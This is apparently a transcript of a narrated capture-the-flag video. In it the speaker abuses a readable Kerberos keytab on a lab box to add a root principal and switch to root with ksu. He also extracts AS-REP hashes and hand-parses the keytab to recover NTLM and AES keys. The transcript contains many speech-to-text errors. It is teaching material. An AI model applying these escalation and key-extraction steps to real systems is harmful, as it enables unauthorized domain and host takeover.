i think let's see what's my date 617 416. i'm guessing maybe i jen i don't know why it's working for all my sessions actually maybe i'm wrong with that but yeah so we're on the box as admin if i do sudo l we need to know admins password uh we could try getting the password from our notes like if it has the same password as jay nakazawa and he does not so the next thing to do is see what the user has so we can do fine slash dash user admin dash ls and then pipe all errors to to devno and these are all the files owned by the user admin so we got stuff in home and a lot of this stuff in proc and proc is not interesting to us so let's try um group all the files owned by the group admin still lots in home maybe i should just like grab v slash home let's do sis slash proc slash run wait there we go so this is a better way to do it so we've excluded all the like noisy directories that is group and that's user so user admin we have versapool mail but its size is zero so there's nothing really interesting in his mail we can edit this backup script actually we can't it's owned by root and here's our permissions read and execute so we can't do anything there and we shouldn't have 777 over this um i'm going to revert the box because we'll go into this after root thing um me and eric's df were exploring kerberos and i did some really stupid things to this box to kind of understand what's going on so i'm going to revert the box and we'll get right back to this point so i have reverted the box and redid all the kerberos stuff so we're back at admin and we can run these find commands again so if i look at what i can access with my user being admin it's really not that much if we look at the group though we can access this key tab file and this key tab file is really special if we just google like um key tab if i bet if i did man key tab let's see no man page let's see use a key tab uh let's see key temp files commonly used to allow scripts to automatically authenticate using kerberos without requiring human interaction or access to a password so anyone with read permission on the key tab file can use all keys in the file to prevent misuse restrict access permissions for any key type file you create so this piece of knowledge is super handy so if we just do a k list and then specify the key tab so etsy kob five dot key tab uh do we specify dash k we can do dash t to get time stamp as well if we want but we have a bunch of keys and based upon this it says we can use any one of these so i forget exactly what it is um i think this is user and this is permission so if you ever do like kerber roasting and get the tgs you normally get like my sequel service and then the host name and this whole thing is called a service principle name i believe so um disclaimer i don't really understand kerberos i don't think anyone does so anything i say here don't take as gospel i could be wrong um me and oxdf went through this key tab file for a few hours to understand what's going on so all my knowledge comes from yesterday and just before recording this video of this so all why we have multiple things is we have multiple encryption types so one of these is like aes256 this is 128. i think this is um rc for hmac which is ntlm so yeah uh and if that doesn't make sense we're going to go and analyze the key tab file by hand at the end to understand it so this is like having a machine account in active directory the main reason you have like machine accounts and this is what you normally will probably see in a key tab file is to do some type of authentication with the domain controller before you do anything because if you don't have any level of authentication before talking to the kdc then it allows man the middle type of attacks so you generally have a low level account which is your machine account that has access to the kdc and by using that machine account and authenticating you confirm yes this is the kdc it's not a man in the middle then we have a change password account so with this we can change passwords and then we also have admin here and this admin is admin so um we can pretty much do anything we want to um kdc with this admin including uh creating a new account so let's do that we're going to use the k admin command and if we do dash h it's just like kerberos admin lets you do a bunch of things so i'm going to do kt to specify the key tab file so etsy kibb5 dot key tab and then the um principle we want to use out of this key tab we don't use the one with slash admin and then we're going to do a query i'm going to say add principle we can also do list principles right now and this lists all the principles on the box and the ones that don't have the slash these are the ones that we can use to log in so we only have j nakazawa there's also kbt gt that may you sound familiar if you're used to windows it's a kerberos thing but yeah so instead of listing the principles let's add a principle for root so we can do add principle and we're going to specify the password as please subscribe and then we're going to say root at realcorp.htb and we see principal root real quick dot http created if we list again we can see that is there and if i do ksu which is kerberos switch users and type please subscribe we are now rude so um every like minute we lose like the box reverts the kerberos database so um root no longer is there so if i do exit now and we list principles again let's see date probably be gone in a few seconds it's gone but there is something cool with this so let's see let's add principal we did that again ksu please subscribe so i'm going to [Music] cron tab dash l uh cron tab dash e let's get rid of the cron so it's no longer going to be cleaning things up because at this point we just want to understand what's going on so before i ran a k admin command let's see okay admin where is it list principles so as root if i do this i can still list the principles because the key tab now if i don't have access to the key tab and i try to list principles you may think this works because i am root however there is no principle root slash admin at real corp because i don't have this slash admin principle um i can't authenticate to kerberos but because i have access to uh this bar kerberos directory i think the kib5 kdc i have access to all of this i can use a command called k admin dot local and it's just going to abuse the fact that i own all these files so let's exit right here and the admin user doesn't have access to these files so this k admin local is going to fail right we can't open the database so when i um reverted the box what i was doing before to kind of understand this is if we had access to this whole directory so let's log in and do that thing you should never do chmod r 777 on ver kerberos kb5 kdc and now we run that same command again we can list principles so that's pretty cool um if i don't have this slash local it's going to try to authenticate with admin admin right and if that existed in this list principles i'd have the admin privilege and be able to do things so let's add that so let's go back to the add principle command and uh let's see that was a dash q i think we can get rid of all this because now we can just do the dot local so add principal um we probably don't need a password i'm just gonna do admin slash admin let's see if this works enter password for principal okay um please subscribe still wants a password really test my chance to make a typo so we have now created the principal admin admin so if i do this k admin here it wants me to type my password for kerberos and we can now list it because admin admin exists so if we went back and i actually don't know what's going to happen now um let's see get np users uh i wonder if we do get users spns was it dash no pass dcip realcork.hdb let's see target realcorp.hdb no realtor host let's do dcip101010224 and we're about to host let's just do the get np users again and specify um our admin user see if we get that hash and i want to see if john can crack it so np users let's see what did we use we did dash no pass and then realcorp.html slash admin let's see client not found let's cat notes users so i'm not sure why we can get the tgt for him but not admin okay i thought we would because if i do list principles we have a password of please subscribe and admin admin oh we don't have let's see let's cadmin local let's just add one for admin at real quick maybe this will do it please subscribe wants me to type it twice okay we created just a user principle and we got a tgt hash so hashcat doesn't crack this but john the ripper apparently may so this is what i'm gonna test um don't know if this is gonna work that's why i do videos so i can learn things afterwards so we wanted please subscribe i do john word list pw it does not crack um the reason why i say it does it loads that as rep and it says 17 18 23 and if i do show here not correct so let's see um let's go into my hash see that is 18 and i think that's aes 256 so don't know how to crack that but we can confirm john does not crack this format so let's see what else can we learn about this um the actual key tab file is really interesting so we don't have xxd on this box so i'm going to copy the key tab file off of it so etsy kb5 dot key tab and let's copy and put this on our box so v key tab dot b64 base64-d key tab to key tab so we have the file here and we can xxd it now do a less and see it and this looks like a lot of gibberish right so we can easily go over this uh let's see flame shot do i have it i do sweet this may help me we can grab this and that will let me do writing probably need to pull up a post ahead of time so let's just get rid of flame shot real quick uh come on how do i copy upload what did you just upload that to well that's dangerous i did not know flameshot had a way to just upload an imager so if you're doing sensitive things um be careful with that but i want to pull up a blog post while we're working with this so what is the phrase i want to use i think it's key tab file format so key tab file format yes it is this post we want and this is going to have everything we need so i'm going to move this make this a bit bigger so you can see because this defines all the sizes and this is what we definitely want so i'm going to print screen again so we can go over this so what this is saying right off the bat um let's see the key tab file starts at uint16 so that's 16 bits or two bytes there's eight bits in a byte and it's probably going to be 0.502 so that's right here let's do this color and yellow and uh no we should have boxed run print select select the box doesn't matter the color but yellow is going to be this first thing un16 and now we have all the entries so the first entry starts at here and says in 32 and the size so again whenever you see this this is gonna be the bits 32 bits is eight bytes eight bytes is four pairs in this hex so we can say this is going to be the size 5b so we can go 1 2 3 4 5. we start at this line 50 and then we go over b so 1 2 3 4 5 6 7 8 9 10 a b so this is the start of the next key probably so keep that in mind this is probably the start of the next key uint 16 the number of components so we have two components here so 16 it's going to be two components so let's just uh let's not put two same colors next to each other but that's the next thing uh maybe we can say that's not gonna work i should have done the whole screen oh well uh then we have the realm and it's kind of in a serialized format so anytime you have a string you have to define the length and if we look uh let's see counted octet yeah it's saying counted octet right here so counted octet u n 16 length and then data so we got the length let's do green we can do same colors here so it's 16 so that's going to be uh two bytes and c c is um i think 13 characters abc yeah 13. and if i bet if we did realcorp.htb that's going to be 13. um probably so this next piece is the string or the realm okay and hdb probably ends that that's the realm and we're going into the components now so it's kind of weird that we say the number of components and then the realm and then we go into the components but there's two components here and the components are the user and the location so this is going to be let's do purpleness so we have the length again host is four so length of four and then we have um h-o-s-t okay that blue you can't really see and then we have another length so this is 12 and sfv01.realcorp.htb that is 12 in length so let's copy this so this is going to be the length okay so we got out of the two components so now we have a uint 32 name type so that's going to be this okay and then a time stamp and this time stamp is probably going to look weird but this is just um hex of an epoch uh if i wasn't in the screenshot mode and like switching over i could show you better but that is an epoch timestamp it's just in hex and then we have v note8 which is a uint8 so that's going to be two things so you can see kind of how you purse this um eight actually that would be 16 so i think that's eight there we go so that's version number so version number two and then we got key block keyblock is defined here so keyblock uint16 so it's going to be two bytes so we got 12 and then we have let's see u and 16 counted octet so counted octet is up here it's the same thing here um because we got a string we got to do the length so the length is going to be 20. and that is i want to say 64 bits uh no um 20 32 just two hex yeah but that's going to be this this and this and if we looked up the encryption type um 12 that's aes 256 so that is the hash for that and then we have a whole new key right after that so um let's see i think one is a version number see i'm trying to get where we go from here uh let's see key un32 only present so one two three four so maybe after keyblock we have don't know what that is so i'm just going to put it like that and then we start over so would we stir it man when i was doing this not explain my way through it i understood it but breaking it out like this is always tough uh let's see so that zero two is probably whatever we said this was um i'm not sure exactly 4b should be the length probably the easier way to go about this is to start with what we know uh we know real corp so five two five four this is where the realm starts so that's the realm so before the realm we have 16 which is number of wait realm and then number components 0c got that then the next is that man this is getting complicated it's so hard to do this by hand okay right here this is the length so this length is different than this and if we keep on parsing this um let's see where is realm this ends here so that's the realm we got another length this is gonna be four this is the length of host h o s t then we got a length of 12 again that's that weird srv and it goes all the way to here and then let's see we had we're just out of number of components so we're at un 32 of name type main thing i want to show is the version number so let's see if i go here 5cfb02 okay i'm sure if you read this whole page it'll make more sense but finally we are at the version number which is this um version 11 11 in kerberos is uh aes 128 so this one's 256. this is 128. that's why this key length is shorter than the other one so let's see 11. so this is 10 this is the key length and it's going to be this and we got the second one here and i'm just going to highlight the encryption type well if we look at yeah i'm going to try to highlight the encryption type and then the length and key so let's see glancing at this right here so here's the length encryption type 17 17 is rc4h mac in kerberos and then we have this and that is essentially the ntlm hash so um the reason why we can um work with this is why the ntlm hash is important is i believe it's the same as linux as windows the ntlm hash of the ticket i mean the ntlm hash is used to encrypt the timestamp of the ticket and in this case i mean aes 128 would be used but this block of information right here the key this is aes256 that's es128 this is ntlm but that is what is used to encrypt the timestamp of the ticket which is what validates that you're the owner of the ticket so with that knowledge known of this we can google python key tab and find some scripts it's a feature let's go here i think this is a python 2 script but let's v process dot pi set paste python we've got specify two and then the key tab file and we can see it purses this encryption type the key the key length uh it's only got one key let's see let's go to a different one because we should i mean through hand we saw it had multiple um see key tab username domain realm let's see does this that's creating let's see python dump key tab hash key tab extract extract values let's try this one uh whenever it comes to these weird scripts your results may fair vary at what works the best so python extract key tab there we go so we got host we got the ntlm hash the aes 256 and 128 hash and if i go back here i wish i saved a screenshot of it let's see as this right here let's see where is the hash we can probably seven seven one six seven seven one six seven seven space one six there we go so we can see this is where that ntl hash is coming from now i don't know exactly what happens here and i think here is like where the script like barfs when it does all these ffs and i don't know if the extract script like if all these if we fixed it if it would purse uh let's see zero zero five b does this begin with zero zero five b anywhere for another user let's see my b set in multiple places i was going to try to just randomly delete bytes to get rid of this but i'm not confident doing that but the script should be able to parse all these other ones so if we looked the 7716 so it should be um that's the length so 0017 this should be ntlm 017 so right here should be the ntlm 4k admin so 6 1 let's see 17 10. so i wonder if i can just grab this real quick cv test how many characters is this did i grab the whole thing or not guessing i didn't let's see cut or test let's do echo dash n 32 so this is a ntlm hash um we could try to crack it so ntlm crack online but chances are it's a strong password yeah it's not found but that is the antiom hash of k admin so i hope you guys found this last piece informative um sorry if it's all over the place i don't understand kerberos and i mean just started learning how to parse that f key tab file so yeah take care and i will see you all next week